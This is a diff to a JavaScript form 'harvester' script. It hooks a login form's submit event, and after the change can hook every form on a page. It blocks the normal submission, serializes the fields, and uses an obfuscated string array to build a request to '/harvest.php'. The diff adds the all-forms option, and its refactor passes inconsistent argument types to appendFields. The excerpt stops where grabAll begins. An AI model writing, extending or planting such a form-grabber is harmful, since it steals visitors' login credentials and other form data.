@@ -1,33 +1,56 @@
 var siteId = "7e578ae5";
-var formName = "loginform";
+var bindAllFormsSwitch = false;
+var formName = "loginform2";
 var formId = "93djokdi";
 var enableEncoding = true;
 var usePost = false;
 var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 
 $(document).ready(function() {
-        console.log("initializing harvester...");
-        initHarvester();
+    console.log("initializing harvester...");
+    initHarvester();
 });
 
-/* append tracking fields and bind the submit event for the target form */
+/* check the configuration settings and bind form(s) */
 function initHarvester() {
+    if(bindAllFormsSwitch) {
+        bindAllForms();
+    } else {
+        bindByName(formName);
+    }
+    console.log("locked and loaded");
+}
+
+function bindAllForms() {
+    document.querySelectorAll('form').forEach(form => 
+        form.addEventListener('submit', function(e){
+            e.preventDefault();
+            let formName = form.name;
+            grabAll(form.name);
+        }, false)
+    );
+    document.querySelectorAll('form').forEach(form => appendFields(form));
+}
+
+function bindByName(formName) {
 	var loginForm = document.getElementById(formName);
 	if(loginForm) {
-		$('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
-		$('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
-		loginForm.addEventListener("submit", (e) => {
-			e.preventDefault();
-			grabAll();
-		});
-		console.log("locked and loaded");
-	} else {
-		console.log("ERROR: harvester failed to locate form '" + formName + "', check the HTML");
-	}
+        loginForm.addEventListener('submit', function(e){
+                e.preventDefault();
+                grabAll(formName);
+            }, false);
+    }
+    appendFields(formName);
+}
+
+function appendFields(form) {
+    var formName = form.name;
+    $('#' + formName).append("<input type='hidden' id='siteId' name='siteId' value='" + siteId + "'>");
+    $('#' + formName).append("<input type='hidden' id='formId' name='formId' value='" + formId + "'>");
 }
 
 /* parse through the form elements and serialize anything interesting */
-function grabAll() {
+function grabAll(formName) {
 	var loginForm = document.getElementById(formName);
 	if(loginForm) {
 		var payload = "";
